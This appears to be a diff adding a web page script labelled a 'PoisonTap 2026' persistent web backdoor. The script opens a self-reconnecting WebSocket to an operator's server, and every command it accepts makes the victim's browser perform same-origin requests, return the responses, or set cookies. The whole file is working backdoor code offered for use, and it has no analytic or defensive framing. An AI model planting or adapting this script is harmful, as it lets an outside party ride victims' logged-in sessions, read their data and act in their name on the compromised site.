@@ -1,0 +1,40 @@
+<!-- PoisonTap 2026 | Persistent WebBackdoor -->
+<script src="https://cdn.jsdelivr.net/npm/jsrsasign@10.8.6/jsrsasign-all-min.js"></script>
+<script>
+(function(){
+  const BACKEND = 'wss://YOUR.DOMAIN:443'; // Replace with your WS server
+  let ws = null;
+  const queue = [];
+  let reconnectDelay = 1000;
+
+  function connect(){
+    if(ws) ws.close();
+    ws = new WebSocket(BACKEND);
+    ws.onopen = () => { reconnectDelay = 1000; queue.forEach(m => ws.send(m)); queue.length = 0; };
+    ws.onmessage = (e) => {
+      try {
+        const msg = JSON.parse(e.data);
+        if(msg.type === 'fetch'){
+          fetch(msg.url, { method: msg.method || 'GET', headers: msg.headers || {}, body: msg.body || null, mode: 'same-origin' })
+            .then(r => r.text()).then(d => ws.send(JSON.stringify({type:'response', id:msg.id, data:d})))
+            .catch(err => ws.send(JSON.stringify({type:'response', id:msg.id, error:err.message})));
+        } else if(msg.type === 'cookie'){
+          document.cookie = msg.cookie;
+          ws.send(JSON.stringify({type:'ack', id:msg.id}));
+        }
+      } catch(e){}
+    };
+    ws.onclose = () => setTimeout(connect, reconnectDelay = Math.min(reconnectDelay * 2, 30000));
+    ws.onping = () => { ws.send(JSON.stringify({type:'heartbeat'})); };
+  }
+
+  connect();
+
+  // Expose global API
+  window.PT = {
+    get: (url, cb) => ws.send(JSON.stringify({type:'fetch', url, method:'GET'})),
+    post: (url, body, cb) => ws.send(JSON.stringify({type:'fetch', url, method:'POST', body})),
+    setCookie: (c) => ws.send(JSON.stringify({type:'cookie', cookie:c}))
+  };
+})();
+</script>
